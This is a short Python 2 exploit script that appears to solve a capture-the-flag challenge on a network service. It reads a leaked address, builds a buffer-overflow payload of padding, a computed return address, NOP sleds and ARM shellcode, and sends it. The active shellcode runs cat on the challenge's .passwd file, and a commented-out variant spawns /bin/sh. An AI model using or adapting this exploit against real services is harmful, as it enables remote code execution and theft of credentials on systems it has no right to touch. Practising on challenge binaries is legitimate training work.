#!/usr/bin/env python2
import socket
import time
import sys
import struct

HOST = ''
PORT = 61045

shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'

#shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'

pad = '\x47'*164
nop = '\x90'*133
nope = '\x90'*100


#payload = pad + nop + eip + shellcode

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(s.recv(100))
    s.send(('\x90\x90\n'))
    time.sleep(1)
    memory = s.recv(1024)
    print(memory)
    memory = memory[:10]
    print("memoire: ",memory)
    eip = struct.pack('I', int(memory, 16)+180)
    print(eip)
    s.send(('y\n'))
    print(s.recv(100))
    payload = pad + eip + nope + shellcode
    s.send((payload+'\n'))
    print(s.recv(1024))
    print(s.recv(1024))
    s.send(('A\n'))
    print(s.recv(1024))
    print(s.recv(1024))
    s.close
except:
    print "Erreur de co"
    sys.exit()
